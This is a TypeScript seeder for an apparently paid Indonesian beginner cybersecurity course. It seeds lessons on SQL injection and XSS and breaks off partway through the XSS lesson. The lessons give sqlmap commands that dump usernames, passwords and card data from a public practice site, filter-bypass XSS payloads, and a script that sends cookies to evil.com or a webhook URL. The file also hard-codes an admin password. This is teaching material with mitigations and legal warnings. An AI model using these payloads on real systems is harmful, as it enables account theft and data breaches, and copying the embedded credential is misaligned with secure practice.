// CyberEd Seeder v4 — Materi Lengkap & Mudah Dipahami Pemula
// Struktur per materi: Analogi → Tujuan → Apa Itu → Cara Kerja → Persiapan
//   → Tutorial PC (step-by-step + expected output) → Tutorial HP
//   → Bedah Command → Troubleshooting → Mitigasi → Latihan Mandiri
//   → FAQ → Ringkasan → Materi Terkait
import Database from 'better-sqlite3';
import bcrypt from 'bcryptjs';
import { v4 as uuidv4 } from 'uuid';
import path from 'path';

const DB_PATH = path.join(process.cwd(), 'cybered.db');
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

db.exec(`CREATE TABLE IF NOT EXISTS users (id TEXT PK, nama TEXT NOT NULL, email TEXT UNIQUE NOT NULL, password TEXT NOT NULL, no_telepon TEXT DEFAULT '', created_at TEXT DEFAULT (datetime('now')));
CREATE TABLE IF NOT EXISTS materi (id TEXT PK, judul TEXT NOT NULL, deskripsi_singkat TEXT DEFAULT '', konten_lengkap TEXT DEFAULT '', harga INTEGER DEFAULT 0, harga_coret INTEGER, thumbnail_emoji TEXT DEFAULT '📘', level TEXT CHECK(level IN ('mudah','menengah','sulit','sangat_sulit',NULL)), tipe TEXT NOT NULL CHECK(tipe IN ('serangan','pertahanan')), is_gratis INTEGER DEFAULT 0, created_at TEXT DEFAULT (datetime('now')));
CREATE TABLE IF NOT EXISTS akses_materi (id TEXT PK, user_id TEXT NOT NULL, materi_id TEXT NOT NULL, status INTEGER DEFAULT 0, tipe_pembelian TEXT CHECK(tipe_pembelian IN ('satuan','semua')), created_at TEXT DEFAULT (datetime('now')), FOREIGN KEY (user_id) REFERENCES users(id), FOREIGN KEY (materi_id) REFERENCES materi(id), UNIQUE(user_id, materi_id));
CREATE TABLE IF NOT EXISTS pendapatan (id TEXT PK, user_id TEXT NOT NULL, materi_id TEXT, jumlah INTEGER NOT NULL, tipe TEXT NOT NULL CHECK(tipe IN ('satuan','semua')), created_at TEXT DEFAULT (datetime('now')), FOREIGN KEY (user_id) REFERENCES users(id));
CREATE TABLE IF NOT EXISTS admin (id TEXT PK, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS settings (key TEXT PK, value TEXT NOT NULL);`);

db.prepare('INSERT OR IGNORE INTO admin (id, username, password) VALUES (?,?,?)').run(uuidv4(), 'NodeschZ', bcrypt.hashSync('Qwerty1211', 10));
db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?,?)').run('diskon_semua', '40');
db.prepare('DELETE FROM pendapatan').run(); db.prepare('DELETE FROM akses_materi').run(); db.prepare('DELETE FROM materi').run();
const ins = db.prepare('INSERT INTO materi (id, judul, deskripsi_singkat, konten_lengkap, harga, harga_coret, thumbnail_emoji, level, tipe, is_gratis) VALUES (?,?,?,?,?,?,?,?,?,?)');

// ===================================================================
// HELPER: Komponen HTML yang digunakan berulang
// ===================================================================
const WARNING_HTML = `<div class="danger-box">⚠️ <strong>Dilarang Keras Menggunakan Teknik Ini di Sistem Orang Lain!</strong> Materi ini murni untuk edukasi dan latihan di lab milik sendiri atau yang mendapat izin tertulis. Pelanggaran hukum = pidana (UU ITE Pasal 30-36 di Indonesia, Computer Fraud and Abuse Act di luar negeri). Penulis dan CyberEd tidak bertanggung jawab atas penyalahgunaan.</div>`;
const SUMMARY_START = `<div class="summary-box"><ul>`;
const SUMMARY_END = `</ul></div>`;

function faqBox(items: { q: string; a: string }[]) {
  return items.map(it => `<div class="faq-box"><div class="faq-q">${it.q}</div><div class="faq-a">${it.a}</div></div>`).join('\n');
}

// ===================================================================
// GENERATOR KONTEN MATERI LENGKAP
// Param objects berisi SELURUH komponen. Tidak ada yang boleh kosong
// agar konsistensi antar 30 materi terjaga.
// ===================================================================
interface MateriFullOpts {
  judul: string;          // Judul dengan emoji
  tujuan: string;         // Ringkasan hasil akhir yang akan dicapai
  analogy: string;        // Analogi dunia nyata
  pengertian: string;     // Definisi & penjelasan teori (1-3 paragraf)
  caraKerja: string;      // Mekanisme / cara kerja (bisa pakai ASCII diagram)
  asciiDiagram?: string;  // Diagram ASCII opsional
  tools: { pc: string; hp: string; };
  prerequisites: string[];
  pcSteps: { judul: string; isi: string; }[];
  hpSteps: { judul: string; isi: string; }[] | null;
  bedahCommand: { command: string; penjelasan: { flag: string; arti: string; }[]; }[];
  troubleshooting: { masalah: string; solusi: string; }[];
  mitigasi: string;       // Untuk serangan: cara bertahan. Untuk pertahanan: kapan harus pakai teknik ini.
  latihan: string[];      // Tantangan latihan mandiri
  faq: { q: string; a: string; }[];
  ringkasan: string[];
  materiTerkait: string[];
}

function genFull(j: string, o: MateriFullOpts): string {
  const parts: string[] = [];

  // Header & Tujuan
  parts.push(`<h1>${j}</h1>`);
  parts.push(`<div class="info-box"><strong>🎯 Yang Akan Kamu Kuasai:</strong> ${o.tujuan}</div>`);

  // Analogi
  parts.push(`<div class="analogy-box">${o.analogy}</div>`);

  // Apa Itu
  parts.push(`<h2>📖 Apa Itu &amp; Mengapa Penting?</h2>`);
  parts.push(`<p>${o.pengertian}</p>`);

  // Cara Kerja
  parts.push(`<h2>⚙️ Cara Kerjanya (Mekanisme)</h2>`);
  parts.push(`<p>${o.caraKerja}</p>`);
  if (o.asciiDiagram) parts.push(`<div class="ascii-visual">${o.asciiDiagram}</div>`);

  // Persiapan & Tools
  parts.push(`<h2>🎒 Persiapan &amp; Senjata Tempur</h2>`);
  parts.push(`<h3>💻 Untuk PC / Laptop</h3><p>${o.tools.pc}</p>`);
  if (o.tools.hp) {
    parts.push(`<h3>📱 Untuk HP Android</h3><p>${o.tools.hp}</p>`);
  }
  parts.push(`<h3>📋 Prasyarat yang Harus Dipenuhi</h3>`);
  parts.push('<ul>' + o.prerequisites.map(p => `<li>${p}</li>`).join('') + '</ul>');

  // Tutorial PC
  parts.push(`<h2>💻 Tutorial Step-by-Step di PC</h2>`);
  parts.push(`<p>Ikuti langkah-langkah di bawah ini <strong>berurutan</strong>. Setiap langkah ada penjelasan apa yang terjadi dan apa yang seharusnya muncul di layar.</p>`);
  parts.push(`<ol class="steps">`);
  o.pcSteps.forEach(s => {
    parts.push(`<li><strong>${s.judul}</strong><br/>${s.isi}</li>`);
  });
  parts.push(`</ol>`);

  // Tutorial HP (jika ada)
  if (o.hpSteps && o.hpSteps.length > 0) {
    parts.push(`<h2>📱 Tutorial Step-by-Step di HP Android</h2>`);
    parts.push(`<p>Untuk pengguna HP, begini caranya. Pastikan HP kamu Android 7+ dan punya koneksi internet.</p>`);
    parts.push(`<ol class="steps">`);
    o.hpSteps.forEach(s => {
      parts.push(`<li><strong>${s.judul}</strong><br/>${s.isi}</li>`);
    });
    parts.push(`</ol>`);
  }

  // Bedah Command
  if (o.bedahCommand.length > 0) {
    parts.push(`<h2>🔍 Bedah Command (Penjelasan Tiap Parameter)</h2>`);
    parts.push(`<p>Buat kamu yang baru pertama kali liat command Linux, bagian ini WAJIB dibaca. Jangan cuma copas-tempel — pahami artinya.</p>`);
    o.bedahCommand.forEach(bc => {
      const items = bc.penjelasan.map(p => `<span class="cmd-flag">${p.flag}</span> <span class="cmd-desc">→ ${p.arti}</span>`).join('<br/>');
      parts.push(`<div class="cmd-break"><strong>${bc.command}</strong><br/>${items}</div>`);
    });
  }

  // Troubleshooting
  parts.push(`<h2>🛑 Troubleshooting: Kalau Ada Error</h2>`);
  parts.push(`<p>Berikut error paling sering terjadi dan cara mengatasinya:</p>`);
  o.troubleshooting.forEach(t => {
    parts.push(`<div class="tip-box"><strong>❌ Masalah:</strong> ${t.masalah}<br/><strong>✅ Solusi:</strong> ${t.solusi}</div>`);
  });

  // Mitigasi / Real Case
  parts.push(`<h2>🛡️ ${o.mitigasi.startsWith('Cara') ? 'Cara Mempertahankan Diri' : 'Penerapan di Dunia Nyata'}</h2>`);
  parts.push(`<p>${o.mitigasi}</p>`);

  // Latihan Mandiri
  parts.push(`<h2>🏋️ Latihan Mandiri</h2>`);
  parts.push(`<p>Coba tantangan berikut untuk menguji pemahaman kamu:</p>`);
  parts.push('<ol>' + o.latihan.map(l => `<li>${l}</li>`).join('') + '</ol>');

  // FAQ
  parts.push(`<h2>❓ Pertanyaan yang Sering Muncul</h2>`);
  parts.push(faqBox(o.faq));

  // Ringkasan
  parts.push(`<h2>📌 Ringkasan Materi</h2>`);
  parts.push(SUMMARY_START);
  o.ringkasan.forEach(r => parts.push(`<li>${r}</li>`));
  parts.push(SUMMARY_END);

  // Materi Terkait
  if (o.materiTerkait.length > 0) {
    parts.push(`<h2>🔗 Materi Terkait yang Sebaiknya Dipelajari Juga</h2>`);
    parts.push('<ul>' + o.materiTerkait.map(m => `<li>${m}</li>`).join('') + '</ul>');
  }

  return parts.join('\n');
}

// ===================================================================
// Helper shorthand: f(j, opts, harga, hargaCoret, emoji, level, tipe, gratis)
// ===================================================================
function f(
  j: string, o: MateriFullOpts,
  h: number, hc: number | null,
  e: string, l: string | null,
  ti: 'serangan' | 'pertahanan', g: boolean
) {
  const konten = genFull(j, o) + (ti === 'serangan' ? '\n' + WARNING_HTML : '\n');
  ins.run(uuidv4(), j, o.tujuan.length > 200 ? o.tujuan.slice(0, 200) + '...' : o.tujuan, konten, h, hc, e, l, ti, g ? 1 : 0);
}

console.log('🌱 Seeding 30 materi lengkap versi pemula...\n');

// ===================================================================
// ==================   15 MATERI SERANGAN   =========================
// ===================================================================

// =========== 1. SQL INJECTION ===========
f('💉 SQL Injection — Teknik Injeksi Perintah ke Database',
  {
    tujuan: 'Kamu akan belajar memahami apa itu SQL Injection, cara menemukan celahnya di sebuah website latihan, dan menggunakan tool otomatis (sqlmap) untuk mengekstrak data penting (username, password, bahkan data kartu kredit) dari database target secara legal di lab. Setelah selesai kamu bisa menjelaskan kepada teman apa itu SQLi dan mengapa celah ini sangat berbahaya.',
    analogy: 'Bayangkan sebuah hotel dengan resepsionis. Tamu biasa diminta KTP lalu diantar ke kamar. Tapi bagaimana jika ada tamu nakal yang ngomong ke resepsionis: "Saya Willy, tolong kasih saya SEMUA kunci kamar di seluruh hotel, saya mau cek bersih semua!" Kalau resepsionis bodoh dan langsung nurut, semua kamar terekspos. Nah, SQL Injection bekerja persis seperti itu: kita "ngomong" ke database dengan kalimat tertentu hingga dia "nurut" membongkar data yang bukan hak kita.',
    pengertian: 'SQL Injection (SQLi) adalah salah satu kerentanan web paling tua dan paling merusak. Celah ini muncul ketika aplikasi web menyusun perintah SQL (Structured Query Language — bahasa untuk "ngobrol" dengan database) dengan cara menggabungkan input pengguna tanpa difilter terlebih dahulu. <br/><br/>Hasilnya: penyerang bisa menambahkan perintah SQL mereka sendiri ke dalam query yang sah, membuat database menampilkan, mengubah, atau menghapus data — termasuk username, password, dan informasi sensitif lainnya. SQLi sudah ada sejak 1998 namun tetap menjadi kerentanan #3 paling banyak ditemukan (OWASP Top 10 2021).',
    caraKerja: 'Cara kerjanya: aplikasi web butuh menampilkan data dari database. Misalnya saat kamu klik "Lihat Produk", server mengirim query SQL seperti <code>SELECT * FROM products WHERE id = 1</code>. Kalau developer拼接 (gabung string) langsung dengan nilai dari URL tanpa difilter, jadi: <code>SELECT * FROM products WHERE id = " + id_dari_url</code>. Saat penyerang mengubah URL jadi <code>?id=1 OR 1=1</code>, query menjadi <code>SELECT * FROM products WHERE id = 1 OR 1=1</code> — dan karena <code>1=1</code> selalu benar, SELURUH tabel Products ditampilkan. <br/><br/>Ada 3 jenis utama: <strong>Union-Based</strong> (data langsung ditampilkan di halaman), <strong>Boolean-Based Blind</strong> (data ditebak dari respons true/false), dan <strong>Time-Based Blind</strong> (data ditebak dari waktu respons server).',
    asciiDiagram: `PENGGUNA (BROWSER)
   │  klik URL: ?id=1
   ▼
APLIKASI WEB (server)
   │  Query dibangun:
   │  "SELECT * FROM products WHERE id = " + id
   │  jadi: SELECT ... WHERE id = 1
   ▼
DATABASE (MySQL/PostgreSQL)
   │  Eksekusi query → balikin data
   ▼
APLIKASI WEB
   │  Tampilkan data ke halaman
   ▼
PENGGUNA (lihat hasilnya)

↓↓↓ KALAU SERANGAN ↓↓↓

PENYERANG  ──► ?id=1 OR 1=1 UNION SELECT password FROM users
APLIKASI   ──► gabung string tanpa filter
DATABASE   ──► balikin baris produk + password admin!
PENYERANG  ◄── melihat password admin di halaman`,
    tools: {
      pc: '<strong>sqlmap</strong> (install via <code>sudo apt install sqlmap</code> di Linux, atau download dari sqlmap.org untuk Windows). Opsional: <strong>Burp Suite Community</strong> dari portswigger.net (untuk intercept request). Browser modern (Chrome/Firefox). Pastikan pakai OS Linux/macOS — kalau Windows, install WSL (Windows Subsystem for Linux).',
      hp: 'Termux (WAJIB install dari F-Droid, BUKAN Play Store — versi Play Store sudah usang). Di Termux nanti kita install Python dan sqlmap via pip. Browser Chrome di HP juga dipakai untuk eksplorasi target.'
    },
    prerequisites: [
      'Sudah install Python 3.8+ di PC / Termux',
      'Paham cara membuka terminal dasar (cd, ls, clear)',
      'Punya minimal 2 GB ruang kosong di disk',
      'Koneksi internet stabil (untuk download tool dan akses target latihan)',
      'Sudah memahami konsep dasar HTML & URL parameter',
    ],
    pcSteps: [
      { judul: 'Buka terminal dan install sqlmap', isi: 'Nyalakan laptop, buka terminal (Ctrl+Alt+T di Linux, atau klik kanan Start → Terminal di Windows). Ketik: <pre><code>sudo apt update\nsudo apt install sqlmap -y</code></pre>Tunggu sampai selesai (sekitar 1-2 menit). Kalau di Windows tanpa WSL, download zip dari sqlmap.org, extract ke folder, dan buka command prompt di folder tersebut.' },
      { judul: 'Verifikasi sqlmap terpasang', isi: 'Cek versi sqlmap: <pre><code>sqlmap --version</code></pre>Kalau muncul seperti <code>1.7.x#stable</code> berarti sudah terpasang. Kalau muncul "command not found", ulangi install atau cek PATH.' },
      { judul: 'Buka target latihan LEGAL di browser', isi: 'Buka Chrome, akses URL: <code>http://testphp.vulnweb.com/artists.php?artist=1</code>. <strong>Ini adalah target latihan resmi dari Acunetix (perusahaan keamanan)</strong> — AMAN dan LEGAL untuk dipelajari. Kamu akan lihat daftar artis seperti "Bin Ge, Richard"><br/><br/>⚠️ JANGAN PERNAH coba ke website lain yang bukan milik kamu! Univ ini lab berdiri sendiri untuk tujuan edukasi.' },
      { judul: 'Uji kerentanan dasar (manual)', isi: 'Coba tambahkan karakter petik satu (apostrof) di akhir URL: <code>http://testphp.vulnweb.com/artists.php?artist=1\\'</code>. Tekan Enter. <br/><br/>Kalau muncul error SQL — seperti <code>You have an error in your SQL syntax</code> atau halaman error 500 — artinya target SQLi-vulnerable! <br/><br/>Kalau TIDAK error, coba double petik: <code>?artist=1"</code>. Kalau masih tidak error, coba karakter lain: <code>?artist=1\\)</code> atau <code>?artist=1--</code>.' },
      { judul: 'Jalankan sqlmap untuk scan otomatis', isi: 'Kembali ke terminal. Jalankan sqlmap untuk scan dasar: <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --dbs</code></pre>Penjelasan flag: <code>-u</code> (URL target), <code>--batch</code> (otomatis jawab "Yes" untuk semua prompt, biar gak perlu interaksi), <code>--dbs</code> (minta sqlmap cari SEMUA nama database di server). <br/><br/>Tunggu 30 detik sampai 3 menit — sqlmap akan jalan banyak tes. Akan muncul output panjang berwarna hijau.' },
      { judul: 'Baca hasil: lihat database yang ditemukan', isi: 'Setelah selesai, scroll ke atas dan cari bagian berwarna kuning/hijau yang bunyinya: <code>available databases [2]</code>. Seharusnya muncul dua database: <strong>acuart</strong> dan <strong>information_schema</strong>. <br/><br/>Database <code>acuart</code> = database aplikasi utama (mengandung data user, produk). <code>information_schema</code> = database sistem MySQL berisi metadata tabel sistem.' },
      { judul: 'Lihat tabel di dalam database "acuart"', isi: 'Sekarang cari tahu tabel apa saja yang ada di database acuart: <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart --tables</code></pre>Tunggu beberapa detik. Akan muncul daftar tabel. Catat yang paling penting: tabel <code>users</code> — ini biasanya berisi username, password, email, dll.' },
      { judul: 'Lihat kolom di dalam tabel users', isi: 'Sekarang intip kolom apa saja di tabel users: <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart -T users --columns</code></pre>Akan muncul daftar kolom. Pada latihan ini kamu akan lihat: <code>uname</code>, <code>pass</code>, <code>email</code>, <code>cc</code> (credit card!), <code>phone</code>, <code>address</code>. <br/><br/>🎉 <strong>Checkpoint Sukses!</strong> Kalau sudah lihat kolom ini, kamu sudah berhasil menemukan struktur database target!' },
      { judul: 'Ekstrak (dump) username dan password!', isi: 'Sekarang ambil data username dan password: <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart -T users -C uname,pass --dump</code></pre>Tunggu 1-5 menit (kalau ada hash yang perlu di-crack). sqlmap akan:<br/>1) Ambil data dari database<br/>2) Decrypt hash jika bisa<br/>3) Tampilkan di terminal<br/><br/>Kamu akan lihat output seperti:<br/><pre><code>Database: acuart\nTable: users\n[2 entries]\n+--------+----------+\n| uname  | pass     |\n+--------+----------+\n| test   | test     |\n| jimmy  | 6lOg7... |\n+--------+----------+</code></pre>' },
      { judul: 'Latihan bonus: ekstrak data kartu kredit', isi: 'Coba ekstrak kolom kartu kredit (latihan, bahwa data sensitif bisa kena): <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart -T users -C uname,cc,email,phone --dump</code></pre>Hasilnya: kartu kredit PALSU untuk latihan — tapi ini menunjukkan betapa jika production database rentan, data kartu kredit riil bisa bocor.' },
    ],
    hpSteps: [
      { judul: 'Install Termux dari F-Droid', isi: 'Di HP Android, buka browser → ketik <code>f-droid.org</code> → download APK F-Droid → install (izinkan dari "Sumber Tidak Dikenal" sementara di Settings). Buka F-Droid → cari "Termux" → install.<br/><br/>⚠️ Penting: JANGAN install Termux dari Play Store! Versi Play Store tidak update lagi sejak 2020 dan banyak error.' },
      { judul: 'Update Termux & install dependencies', isi: 'Buka aplikasi Termux (layar hitam terminal). Tunggu inisialisasi pertama (~30 detik). Jalankan: <pre><code>pkg update -y\npkg upgrade -y\npkg install python -y\npkg install git -y</code></pre>Tunggu 5-10 menit. Ini install Python dan git di HP kamu.' },
      { judul: 'Install sqlmap via pip', isi: 'Sekarang install sqlmap: <pre><code>pip install sqlmap</code></pre>Tunggu 3-5 menit. Setelah selesai, cek: <pre><code>sqlmap --version</code></pre>Kalau muncul versi, sqlmap siap dipakai!' },
      { judul: 'Jalankan scan dari HP', isi: 'Ketik command sama seperti di PC: <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --dbs</code></pre>Tunggu 1-5 menit. Output akan muncul di layar HP kamu. Geser ke atas untuk lihat semua output.' },
      { judul: 'Ekstrak data dari HP', isi: 'Lanjutkan: <pre><code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart -T users -C uname,pass --dump</code></pre>Tunggu sampai selesai. Untuk salin hasil: tahan layar → pilih teks → copy → paste ke Notes / kirim ke PC kamu.' },
    ],
    bedahCommand: [
      {
        command: 'sqlmap -u "URL" --batch',
        penjelasan: [
          { flag: 'sqlmap', arti: 'Memanggil program sqlmap (tool otomatis untuk SQLi)' },
          { flag: '-u', arti: 'Menentukan URL target (u = url). Harus pakai tanda kutip jika URL mengandung karakter spesial.' },
          { flag: '"http://..."', arti: 'URL lengkap target serangan, termasuk parameter yang curiga (di sini: ?artist=1)' },
          { flag: '--batch', arti: 'Mode non-interaktif: sqlmap otomatis jawab "Yes" untuk semua pertanyaan (misal "crack hash? Y/N")' },
        ]
      },
      {
        command: '-D acuart -T users -C uname,pass --dump',
        penjelasan: [
          { flag: '-D acuart', arti: 'Database target yang akan diserang (D = database)' },
          { flag: '-T users', arti: 'Tabel target di dalam database itu (T = table)' },
          { flag: '-C uname,pass', arti: 'Kolom spesifik yang mau diambil (C = column). Bisa multi-kolom dipisah koma.' },
          { flag: '--dump', arti: 'Perintah untuk EKSTRAK (dump) data dari kolom yang diminta ke terminal/file' },
        ]
      },
    ],
    troubleshooting: [
      { masalah: '❌ "sqlmap: command not found" (di PC)', solusi: 'Install ulang: <code>sudo apt install sqlmap</code>. Kalau pakai Windows tanpa WSL, install python via python.org, lalu <code>pip install sqlmap</code>.' },
      { masalah: '❌ "Permission denied" saat ekstrak', solusi: 'Tambahkan <code>sudo</code> di depan command sqlmap di Linux, atau jalankan command prompt sebagai Administrator di Windows.' },
      { masalah: '❌ Termux: "pkg: not found"', solusi: 'Versi Termux kamu terlalu lama. Uninstall Termux dari HP, install ulang dari F-Droid (bukan Play Store). Lalu <code>pkg update -y</code> dulu.' },
      { masalah: '❌ "Connection timeout" atau "target not reachable"', solusi: 'Cek koneksi internet. Kalau pakai wifi publik, coba pakai data seluler. Pastikan URL target benar: <code>http://testphp.vulnweb.com/artists.php?artist=1</code>.' },
      { masalah: '❌ sqlmap menggantung lama (lebih dari 10 menit)', solusi: 'Ini normal di tengah proses, terutama saat brute force password. Tunggu aja. Kalau lebih dari 30 menit untuk target latihan, tekan Ctrl+C dan coba lagi.' },
    ],
    mitigasi: 'Cara mempertahankan diri dari SQL Injection:<br/><br/>1) <strong>Parameterized Query / Prepared Statement</strong>: query dan data dipisah, user input tidak pernah disisipkan langsung ke query string. Contoh aman (Node.js): <code>db.query("SELECT * FROM users WHERE id = ?", [userId])</code><br/>2) <strong>ORM (Object-Relational Mapping)</strong>: pakai Sequelize, Prisma, SQLAlchemy — semua otomatis parameterisasi.<br/>3) <strong>Input Validation</strong>: cek tipe data (kalau ID harus angka, tolak selain angka).<br/>4) <strong>Least Privilege</strong>: user database aplikasi HANYA punya izin SELECT/INSERT ke tabel tertentu, BUKAN DROP/DELETE ke seluruh database.<br/>5) <strong>WAF (Web Application Firewall)</strong>: ModSecurity + OWASP CRS, atau Cloudflare WAF, untuk block pola SQLi otomatis.<br/>6) <strong>Error Handling</strong>: jangan tampilkan error SQL mentah ke user — tampilkan pesan umum saja ke user, log detail ke server.',
    latihan: [
      '🔰 Coba ubah URL target jadi <code>?artist=999</code> (ID yang tidak ada). Apa yang terjadi? Kenapa?',
      '🔰 Coba sqlmap dengan tanpa <code>--batch</code> — lihat semua prompt yang muncul. Apa bedanya dengan --batch?',
      '🟡 Coba inject manual SQL sederhana: buka URL <code>?artist=1 OR 1=1</code> di browser. Lihat apa yang berubah.',
      '🟡 Scan target latihan lain: <code>http://testphp.vulnweb.com/login.php</code> dengan sqlmap. Temukan username admin yang tersimpan di database.',
      '🔴 Baca OWASP Top 10 (owasp.org/Top10) — apa perbedaan SQLi versi 2021 dengan versi 2017?',
    ],
    faq: [
      { q: 'Apakah SQLi masih relevan di 2024+?', a: 'Sangat relevan. Meskipun sudah 25+ tahun, SQLi masih masuk OWASP Top 10 ranking #3 (2021). Banyak aplikasi lama (PHP-mysql lama, ASP klasik, codebase tanpa ORM) masih rentan.' },
      { q: 'Apakah sqlmap bisa dipakai di Windows?', a: 'Bisa, tapi lebih mudah di Linux. Di Windows, install WSL (Windows Subsystem for Linux) lalu jalankan command Linux di sana. Atau download zip sqlmap.org dan jalanin via Python.' },
      { q: 'Apa beda SQLi dan NoSQL Injection?', a: 'NoSQL Injection target database non-relasional seperti MongoDB. Teknik mirip (manipulasi query), tapi perintah berbeda. Banyak yang keliru mengira NoSQL otomatis aman — padahal tetap rentan jika input user digabung ke query NoSQL.' },
      { q: 'Apakah belajar SQLi itu ilegal?', a: 'Belajar di lab sendiri / target latihan resmi (seperti vulnweb.com yang dipakai di sini) = LEGAL. Mencoba ke sistem orang lain tanpa izin = ILEGAL & PIDANA.' },
    ],
    ringkasan: [
      'SQLi = celah di mana input user digabung langsung ke query SQL tanpafilter',
      'Target latihan legal: testphp.vulnweb.com',
      'Tool utama: <strong>sqlmap</strong> (otomatis scan + dump)',
      'Step kunci: uji manual ?id=1\\' → scan --dbs → -D -T --columns → --dump',
      'Output sqlmap berwarna-warni: hijau = sukses, kuning = warning, merah = error',
      'Pertahanan utama: parameterized query + input validation + WAF',
      'HP bisa via Termux (WAJIB dari F-Droid) + sqlmap via pip',
    ],
    materiTerkait: ['WAF Setup (ModSecurity)', 'Secure Coding Practices', 'Password Cracking'],
  },
  15000, 25000, '💉', 'mudah', 'serangan', false
);

// =========== 2. XSS ===========
f('💀 Cross-Site Scripting (XSS) — Suntik Script Jahat ke Website',
  {
    tujuan: 'Paham konsep XSS, bisa membedakan 3 jenis (Reflected, Stored, DOM-based), bisa suntikkan JavaScript berbahaya ke target latihan, dan bisa menjelaskan kenapa XSS sering jadi pintu masuk pembajakan akun.',
    analogy: 'Bayangin papan pengumuman di kampus. Mahasiswa biasa tempel tulisan biasa. Tapi XSS analoginya: ada yang tempel kode pelacak tersembunyi yang merekam siapa aja yang lewat papan itu, lalu ngirim data ke orang lain. Setiap orang yang baca — identitasnya (cookie) terambil tanpa mereka tahu. Mirip dengan "penyadap" yang menyamar sebagai informasi umum.',
    pengertian: 'Cross-Site Scripting (XSS) adalah kerentanan di mana penyerang bisa menyuntikkan kode JavaScript ke halaman web yang dilihat pengguna lain. Saat korban membuka halaman itu, JavaScript jahat berjalan di browser korban dengan hak akses penuh ke session, cookie, dan data halaman.<br/><br/>Efeknya: pencurian cookie session, keylogger (merekam ketukan keyboard), redirect ke situs phishing, deface halaman, atau trigger aksi tanpa sepengetahuan korban (kirim DM, like, transfer, dll).',
    caraKerja: 'Tiga tipe XSS:<br/><br/>1) <strong>Reflected XSS</strong>: payload dikirim via URL, dipantulkan server langsung di response. Misal: klik link <code>http://target.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> → server tampilkan q di halaman tanpa escape → script jalan.<br/><br/>2) <strong>Stored XSS</strong>: payload disimpan permanen di database (lewat form komentar, profil, dsb). Setiap user yang buka halaman itu kena. Lebih berbahaya dari reflected.<br/><br/>3) <strong>DOM-based XSS</strong>: payload tidak pernah sampai ke server, tapi dimanipulasi client-side via JavaScript yang membaca dari URL/document. Lebih sulit dideteksi scanner.',
    asciiDiagram: `SKENARIO STORED XSS:

[ Penyerang ]
    │
    │ submit komentar: <script>fetch("evil.com?c="+document.cookie)</script>
    ▼
[ Database Server ]  ◄── disimpan permanen di tabel "comments"
    │
    │ ada user lain buka halaman yang ada komentarnya
    ▼
[ Browser Korban ]
    │
    │ script jalan otomatis, kirim cookie ke evil.com
    ▼
[ Penyerang ] ◄── cookie session korban TERTANGKAP! 🎣`,
    tools: {
      pc: 'Burp Suite Community (portswigger.net), Browser Chrome/Firefox + ekstensi "FoxyProxy", Opsional: XSStrike (install via <code>pip install xsstrike</code>).',
      hp: 'Termux (F-Droid) + Python + XSStrike via pip. Browser Chrome Android untuk buka target latihan.'
    },
    prerequisites: [
      'Paham apa itu JavaScript dasar (function, variable, console.log)',
      'Sudah install Burp Suite di PC (download dari portswigger.net — gratis)',
      'Paham konsep HTTP request & response',
      'Paham apa itu cookie HTTP & session',
    ],
    pcSteps: [
      { judul: 'Setup Burp Suite sebagai proxy', isi: 'Buka Burp Suite Community (sudah didownload dan install). Pilih tab "Proxy" → klik "Intercept is on" (seharusnya sudah aktif default). <br/><br/>Sekarang buka Chrome → Settings → Advanced → System → Open proxy settings → atur proxy ke <code>127.0.0.1</code> port <code>8080</code>. <br/><br/>Buka <code>http://burp</code> di Chrome untuk download Burp CA certificate (supaya bisa intercept HTTPS). Install certificate itu di Chrome.' },
      { judul: 'Buka target latihan XSS', isi: 'Di Chrome, buka: <code>http://testphp.vulnweb.com/search.php?test=hello</code>. <br/><br/>Kamu akan lihat form search dan output "Searched for: hello". Coba ubah <code>test=hello</code> dengan nilai lain, lihat apakah tampilannya mengikuti. Kalau ya, ini kandidat reflected XSS.' },
      { judul: 'Uji XSS reflected paling sederhana', isi: 'Coba suntikkan tag script ke parameter test: <code>http://testphp.vulnweb.com/search.php?test=&lt;script&gt;alert(1)&lt;/script&gt;</code><br/><br/>Kalau muncul popup "1" di browser = <strong>XSS Confirmed</strong>!🎉 Target rentan!<br/><br/>Kalau TIDAK muncul, server mungkin filter tag <code>&lt;script&gt;</code>. Lanjut ke step berikutnya untuk bypass filter.' },
      { judul: 'Bypass filter dengan tag lain (kalau ada)', isi: 'Coba tag HTML yang lebih licik yang biasanya BUKAN di-block filter basic:<br/><br/>• <code>test=&lt;img src=x onerror=alert(1)&gt;</code> — tag img dengan event onerror<br/>• <code>test=&lt;svg onload=alert(1)&gt;</code> — svg dengan onload<br/>• <code>test=&lt;body onload=alert(1)&gt;</code> — body onload<br/>• <code>test=&lt;iframe src="javascript:alert(1)"&gt;</code> — iframe javascript scheme<br/><br/>Salah satu biasanya berhasil bypass filter paling basic.' },
      { judul: 'Setup webhook.site untuk tangkap cookie', isi: 'Sekarang kita akan tangkap cookie korban sungguhan. Buka tab baru, akses <code>https://webhook.site</code>. Akan muncul URL unik seperti <code>https://webhook.site/abc-123-def</code>. Copy URL ini — ini "kotak pos" kamu untuk terima data cookie.' },
      { judul: 'Payload XSS yang ngirim cookie ke webhook', isi: 'Sekarang suntikkan payload yang ngirim cookie ke webhook kamu. Ganti <code>WEBHOOK_URL</code> dengan URL unik kamu:<br/><br/><code>test=&lt;img src=x onerror="fetch(\'WEBHOOK_URL?c=\'+document.cookie)"&gt;</code><br/><br/>Contoh konkret jika webhook URL kamu <code>https://webhook.site/abc-123</code>:<br/><pre><code>test=&lt;img src=x onerror="fetch('https://webhook.site/abc-123?c='+document.cookie)"&gt;</code></pre><br/><br/>Buka URL ini di Chrome. Tidak ada popup karena payload ini tidak menampilkan apa-apa — langsung kirim cookie.' },
